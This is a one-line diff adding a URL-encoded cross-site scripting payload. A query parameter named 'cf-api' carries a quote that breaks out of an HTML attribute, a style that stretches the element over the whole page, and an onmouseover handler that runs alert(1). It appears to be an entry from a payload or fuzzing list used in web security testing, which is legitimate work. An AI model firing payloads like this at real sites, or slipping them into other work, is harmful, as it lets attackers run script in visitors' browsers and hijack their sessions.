@@ -1,0 +1,1 @@
+/?cf-api=%22%20style=position:fixed;left:0;top:0;right:0;bottom:0;%20onmouseover=alert(1)%20x
